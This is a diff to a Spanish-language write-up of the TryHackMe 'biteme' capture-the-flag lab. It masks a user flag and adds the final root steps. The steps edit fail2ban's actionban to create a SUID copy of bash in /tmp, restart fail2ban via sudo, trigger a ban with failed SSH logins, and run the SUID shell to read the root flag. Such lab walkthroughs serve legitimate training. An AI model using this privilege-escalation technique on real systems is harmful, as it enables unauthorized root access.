@@ -279,7 +279,7 @@ Enunciado :
 -Obtenemos la flag de usuario
 
     jason@biteme:~$ cat user.txt 
-    THM{6fbf1fb7241dac060cd3abba70c33070}
+    THM{6fbf1.....abba70c33070}
 
 
 -Listamos los permisos que tenemos sobre los comandos que podemos ejecutar con privilegios elevados en el sistema.
@@ -333,7 +333,8 @@ INFO Elevacion de privilegios mediante fail2ban --> https://youssef-ichioui.medi
     actionban = cp /bin/bash /tmp/esevka && chmod 4777 /tmp/esevka     ----> copiamos una bash a /tmp/esevka y le activamos el SUID y le damos maximos permisos.
 
   2)Reiniciamos el servicio para que nuestros cambios se guarden.
-    
+  
+    fred@biteme:~$ sudo /bin/systemctl restart fail2ban
 
   3)Para ejecutar nuestro codigo lo que tenemos que hacer es lo siguiente:
   
@@ -342,7 +343,30 @@ INFO Elevacion de privilegios mediante fail2ban --> https://youssef-ichioui.medi
     - Desde otra ventana de consola intentar conectar varias veces  por ssh introduciendo mal la pass.
       Tras varios intentos nos banearan la ip, ejecutando el codigo que hemos introducido en actionban.
 
-  2)
+  2)Como vemos tras ser baneado vemos que nos crea nuestra bash con el SUID activado.
+
+    fred@biteme:~$ ls -la /tmp
+    total 1128
+    drwxrwxrwt 10 root root    4096 Sep 12 11:17 .
+    drwxr-xr-x 24 root root    4096 Mar  4  2022 ..
+    -rwsrwxrwx  1 root root 1113504 Sep 12 11:17 esevka
+
+  3)Elevamos privilegios y obtenemos la flag
+
+    fred@biteme:~$ /tmp/esevka -p
+    
+    esevka-4.4# whoami
+    root
+    
+    esevka-4.4# cat /root/root.txt 
+    THM{0e35.....41cc6678d}
+
+
+
+    
+
+
+    
 
 
   
